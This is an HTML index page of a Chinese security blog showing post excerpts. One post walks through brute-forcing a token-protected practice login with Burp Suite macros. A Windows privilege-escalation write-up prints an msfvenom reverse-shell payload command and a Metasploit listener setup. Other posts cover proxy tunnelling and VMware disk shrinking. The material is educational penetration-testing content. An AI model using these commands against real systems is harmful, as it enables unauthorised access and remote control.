@@ -1,0 +1,920 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.0.2">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"ryaninf.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta property="og:type" content="website">
+<meta property="og:title" content="r0yanx&#39;s Blog">
+<meta property="og:url" content="https://ryaninf.github.io/page/2/index.html">
+<meta property="og:site_name" content="r0yanx&#39;s Blog">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="r0yanx">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://ryaninf.github.io/page/2/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : true,
+    isPost : false,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>r0yanx's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">r0yanx's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">信息安全点点滴滴</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/ryaninf" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content index posts-expand">
+            
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://ryaninf.github.io/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="r0yanx">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="r0yanx's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/" class="post-title-link" itemprop="url">使用BurpSuite宏获取CSRF TOKEN</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-07-15 14:54:04" itemprop="dateCreated datePublished" datetime="2019-07-15T14:54:04+08:00">2019-07-15</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-08-20 16:41:47" itemprop="dateModified" datetime="2020-08-20T16:41:47+08:00">2020-08-20</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%B7%A5%E5%85%B7/" itemprop="url" rel="index"><span itemprop="name">工具</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
+<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在WEB渗透中经常可以看到页面存在一次性<code>token</code>校验的情况，即请求包中包含<code>token</code>，而<code>token</code>值需通过其它页面获取，导致<code>burpsuite</code>抓包后无法重放。</p>
+<h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><p>下面以一个简单例子来做个说明。目标网站如下，页面存在一个图片验证码，题目要求暴力破解得到账号密码。这题可以有多种方式实现，这里以<code>burpsuite</code>宏进行实验。<br><img src="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-18-55-39.png"></p>
+<h3 id="发现"><a href="#发现" class="headerlink" title="发现"></a>发现</h3><ol>
+<li>目标URL为：<code>http://1.1.1.1/c/hdyzma/welcome.php</code>，抓个包测试一下，发现其会对<code>token</code>参数校验，拒绝重放的数据包。<br><img src="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-18-56-17.png"><br><img src="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-18-56-24.png"></li>
+<li>在登陆页面<code>http://1.1.1.1/c/hdyzma/</code>可发现<code>token</code>值：<br><img src="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-18-56-48.png"></li>
+<li>通过上面的发现，可以使用<code>burpsuite</code>的宏功能自动把登陆页的<code>token</code>值抓取出来填入登陆请求</li>
+</ol>
+<h3 id="创建Macros"><a href="#创建Macros" class="headerlink" title="创建Macros"></a>创建Macros</h3><ol>
+<li>创建<code>Macros</code>，获取<code>token</code>值<br><img src="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-18-57-29.png"></li>
+<li>在<code>Macro Recorder</code>中选择包含要获取的<code>token</code>的页面<br><img src="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-18-57-54.png"></li>
+<li>配置<code>Macros</code><br><img src="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-18-58-16.png"><br><img src="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-18-58-23.png"><br>用鼠标选中<code>token</code>值，<code>burpsuite</code>会自动填写开始标记以及结束标记，并且写上<code>Parameter name</code>为<code>token</code>，注意这里的参数名<code>token</code>是与要爆破页面里的<code>token</code>名称一致：<br><img src="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-18-59-07.png"><br>定义<code>Macro</code>描述，方便区分：<br><img src="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-18-59-30.png"></li>
+</ol>
+<h3 id="创建Session-Handling-Rules"><a href="#创建Session-Handling-Rules" class="headerlink" title="创建Session Handling Rules"></a>创建Session Handling Rules</h3><ol>
+<li><p>然后在Session Handling Rules里面新建一条规则：<br><img src="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-19-00-45.png"><br>设置一个名字，这里叫<code>update_token</code>：<br><img src="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-19-01-02.png"><br>选中刚刚录制好的宏，并且设置要更新的参数名，这里是<code>token</code>：<br><img src="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-19-01-19.png"></p>
+</li>
+<li><p>然后是设置宏的影响范围，因为我们只需要暴力破解账号密码，所以<code>Tools Scope</code>这里只选中<code>Repeater</code>、<code>Intruder</code>就行了，其它模块可根据实际需要勾选:<br><img src="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-19-01-52.png"></p>
+</li>
+</ol>
+<h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h3><ol>
+<li>回到<code>Repeater</code>，点击<code>Go</code>重新发包，可以看到现在<code>token</code>参数会自动刷新：<br><img src="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-19-02-29.png"><br><img src="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-19-02-36.png"></li>
+<li>使用<code>Intruder</code>暴力破解账号密码：<br><img src="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-19-02-54.png"><br>因为多线程会同时刷新<code>token</code>，导致部分请求包拿到的<code>token</code>已经被刷新了，所以只能设置单线程跑：<br><img src="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-19-03-17.png"><br>成功暴破得到账号<code>admin/123456a</code><br><img src="/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/2020-08-19-19-03-32.png"></li>
+</ol>
+<h3 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h3><p>源码来自<a target="_blank" rel="noopener" href="https://github.com/3sNwgeek">3sNwgeek</a>，附上题目：<a target="_blank" rel="noopener" href="https://github.com/3sNwgeek/BruteForc_test">https://github.com/3sNwgeek/BruteForc_test</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://ryaninf.github.io/2019/07/11/%E8%AE%A9BurpSuite%E4%BD%BF%E7%94%A8MSF%E7%9A%84socks4a%E4%BB%A3%E7%90%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="r0yanx">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="r0yanx's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2019/07/11/%E8%AE%A9BurpSuite%E4%BD%BF%E7%94%A8MSF%E7%9A%84socks4a%E4%BB%A3%E7%90%86/" class="post-title-link" itemprop="url">让BurpSuite使用MSF的socks4a代理</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-07-11 18:40:11" itemprop="dateCreated datePublished" datetime="2019-07-11T18:40:11+08:00">2019-07-11</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-08-19 18:51:38" itemprop="dateModified" datetime="2020-08-19T18:51:38+08:00">2020-08-19</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%B7%A5%E5%85%B7/" itemprop="url" rel="index"><span itemprop="name">工具</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
+<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近在使用msf转发流量时遇到了个问题，就是使用auxiliary/server/socks4a做代理时，burpsuite不支持socks4a代理，导致无法使用burp去抓包。而使用auxiliary/server/socks5做代理却失败了，可能是脚本的bug，官方issues也有人反馈这个问题。</p>
+<h3 id="具体问题"><a href="#具体问题" class="headerlink" title="具体问题"></a>具体问题</h3><h4 id="演示环境"><a href="#演示环境" class="headerlink" title="演示环境"></a>演示环境</h4><p>我所在的环境比较特殊，工作机（192.168.1.2，Windows）位于A地内网，MSF机器（172.16.1.2，Linux）位于B地内网，两内网不相通，但是可以通过11.11.11.11:22 SSH访问MSF机器，遂用SSH隧道将172.16.1.2:11080端口转发到工作机的127.0.0.1:1083端口，如果不清楚这个操作，可以理解为工作机访问本机127.0.0.1:1083端口等价于访问MSF机172.16.1.2:11080端口。<br><img src="/2019/07/11/%E8%AE%A9BurpSuite%E4%BD%BF%E7%94%A8MSF%E7%9A%84socks4a%E4%BB%A3%E7%90%86/2020-08-19-18-43-50.png"></p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2019/07/11/%E8%AE%A9BurpSuite%E4%BD%BF%E7%94%A8MSF%E7%9A%84socks4a%E4%BB%A3%E7%90%86/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://ryaninf.github.io/2019/07/11/VMware%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%A3%81%E7%9B%98%E7%A9%BA%E9%97%B4%E5%8E%8B%E7%BC%A9/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="r0yanx">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="r0yanx's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2019/07/11/VMware%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%A3%81%E7%9B%98%E7%A9%BA%E9%97%B4%E5%8E%8B%E7%BC%A9/" class="post-title-link" itemprop="url">VMware虚拟机磁盘空间压缩</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-07-11 18:31:59" itemprop="dateCreated datePublished" datetime="2019-07-11T18:31:59+08:00">2019-07-11</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-08-19 18:45:53" itemprop="dateModified" datetime="2020-08-19T18:45:53+08:00">2020-08-19</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%8A%98%E8%85%BE/" itemprop="url" rel="index"><span itemprop="name">折腾</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>可以使用VMware官方的vmware tools进行压缩。<br>压缩前需要删除虚拟机的快照、链接克隆等，然后在虚拟机中执行：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vmware-toolbox-cmd disk shrink /</span><br></pre></td></tr></table></figure>
+<p>执行后等待进度条结束即可：<br><img src="/2019/07/11/VMware%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%A3%81%E7%9B%98%E7%A9%BA%E9%97%B4%E5%8E%8B%E7%BC%A9/2020-08-19-18-33-08.png"></p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2019/07/11/VMware%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%A3%81%E7%9B%98%E7%A9%BA%E9%97%B4%E5%8E%8B%E7%BC%A9/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://ryaninf.github.io/2019/07/10/%E8%AE%B0%E4%B8%80%E6%AC%A1Windows%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="r0yanx">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="r0yanx's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2019/07/10/%E8%AE%B0%E4%B8%80%E6%AC%A1Windows%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B/" class="post-title-link" itemprop="url">记一次Windows提权过程</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-07-10 18:04:46" itemprop="dateCreated datePublished" datetime="2019-07-10T18:04:46+08:00">2019-07-10</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-08-19 18:42:59" itemprop="dateModified" datetime="2020-08-19T18:42:59+08:00">2020-08-19</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
+<h3 id="通过任意文件上传获取到ASP-webshell"><a href="#通过任意文件上传获取到ASP-webshell" class="headerlink" title="通过任意文件上传获取到ASP webshell"></a>通过任意文件上传获取到ASP webshell</h3><p><img src="/2019/07/10/%E8%AE%B0%E4%B8%80%E6%AC%A1Windows%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B/2020-08-19-18-10-21.png"></p>
+<h3 id="生成msf-meterpreter后门"><a href="#生成msf-meterpreter后门" class="headerlink" title="生成msf meterpreter后门"></a>生成msf meterpreter后门</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe &gt; shell1.exe  </span><br></pre></td></tr></table></figure>
+
+<h3 id="启动监听"><a href="#启动监听" class="headerlink" title="启动监听"></a>启动监听</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler  </span><br><span class="line">set PAYLOAD windows/meterpreter/reverse_tcp  </span><br><span class="line">set LHOST x.x.x.x  </span><br><span class="line">set LPORT xx  </span><br><span class="line">exploit </span><br></pre></td></tr></table></figure>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2019/07/10/%E8%AE%B0%E4%B8%80%E6%AC%A1Windows%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://ryaninf.github.io/2019/07/08/%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="r0yanx">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="r0yanx's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2019/07/08/%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/" class="post-title-link" itemprop="url">浅谈代理隧道的几种应用场景</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-07-08 15:55:02" itemprop="dateCreated datePublished" datetime="2019-07-08T15:55:02+08:00">2019-07-08</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-08-19 18:02:49" itemprop="dateModified" datetime="2020-08-19T18:02:49+08:00">2020-08-19</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h3><p>熟练的代理转发，既可助你穿梭内网，亦可在工作生活中提供便利。理论上，任何接入互联网的计算机都是可访问的，但是如果目标主机处于内网，而我们又想和该目标主机进行通信的话，就需要借助一些端口转发工具来达到我们的目的。</p>
+<h3 id="二、端口转发"><a href="#二、端口转发" class="headerlink" title="二、端口转发"></a>二、端口转发</h3><p>把端口接收到的流量转发到另外一个端口，可以是本机的端口，也可以是其它网络的端口。<br>实现原理：基于传输层协议，把socket字节流原封不动进行转发。<br>弊端：如果上层协议有校验，会出错。比如<code>HTTP协议</code>中部分WEB服务会校验host头，导致HTTP连接中断。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2019/07/08/%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
